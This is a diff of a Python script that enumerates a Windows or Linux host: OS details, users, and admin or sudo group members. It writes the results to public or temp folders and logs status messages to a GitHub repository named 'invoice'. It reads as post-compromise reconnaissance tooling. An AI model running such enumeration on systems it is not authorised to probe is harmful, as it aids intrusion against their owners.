@@ -2,9 +2,13 @@ import ctypes
 import platform
 import subprocess
 import os
+from LogCreator import Log
 
 class OperationalSystemInfo():
-    def gather_windows_info():  
+    def __init__(self, script_name):
+        self.script_name = script_name
+        
+    def gather_windows_info(self):
         ## beschrijving ##
         output_file = r"C:\Users\Public\gather_info.txt"
         screenshot_path = r"C:\Users\Public\gather_info"
@@ -30,11 +34,17 @@ class OperationalSystemInfo():
         output_file.write(f"OS Details: {os_details}\n\n")
         output_file.write(f"Admin group: {gather_admin_result.stdout}\n\n")    
         output_file.write(f"Users in the target: {gather_user_result.stdout}\n\n") 
-
         output_file.close()
-
+        file_creator.create_file("logs", info.script_name,"Script completed successfully")
+        
+    def run_gather_windows_info(self):  
+        try:
+            self.gather_windows_info()
+        except:
+            file_creator.create_file("logs",info.script_name,"Script may have encountered erros")
+            
   
-    def gather_windows_info():
+    def gather_linux_info(self):
         ## beschrijving ##
         output_file = "/tmp/linux_info.txt"
         destination_directory = "/tmp/linux_info"
@@ -73,6 +83,21 @@ class OperationalSystemInfo():
         output_file.write(f"OS Details: {os_details}\n\n")
         output_file.write(f"Users in the system: {gather_user_result.stdout}\n\n")
         output_file.write(f"Users with sudo privileges: {gather_admin_result.stdout}\n\n")
-    
         output_file.close()
+        file_creator.create_file("logs", info.script_name,"Script completed successfully")
+        
+    def run_gather_linux_info(self):  
+        try:
+            self.gather_linux_info()
+        except Exception as e:
+            file_creator.create_file("logs",info.script_name,"Script may have encountered erros")
+            print(e)
 
+repository_owner = 'rsecurity12' 
+repository_name = 'invoice' 
+access_token = ''  
+info = OperationalSystemInfo("OperationalSystemInfo")
+file_creator = Log(repository_owner, repository_name, access_token)
+
+info.run_gather_linux_info()
+ 
